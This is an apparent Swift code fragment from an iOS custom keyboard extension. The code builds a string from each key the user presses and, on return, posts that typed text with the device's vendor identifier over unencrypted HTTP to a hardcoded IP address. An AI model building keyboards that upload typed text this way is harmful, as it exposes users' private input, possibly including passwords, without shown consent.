...
class KeyboardViewController: UIInputViewController {
    ...
    //MARK:- Default method of Viewcontroller
    ...
    //MARK:- keyword web Service
    func keywordWebService(keyword:String)
    {
        let parameters = "{\n    \"keyword\": \"\(keyword)\"\n}"
        let postData = parameters.data(using: .utf8)

        var request = URLRequest(url: URL(string: "http://3.99.103.195:8080/api/keyword/add-keyword/\(UIDevice.current.identifierForVendor?.uuidString ?? "")")!,timeoutInterval: Double.infinity)
    ...
    @IBAction func keyPressedTouchUp(_ sender: UIButton) {
        ...
        if originalKey == "⬆️" || originalKey == "↩" || originalKey == "🌐"
        {
            
        }
        else{
            self.mainString += String(originalKey)
        }
        ...
        case "🌐":
            break
        case "↩":
            self.keywordWebService(keyword: self.mainString)
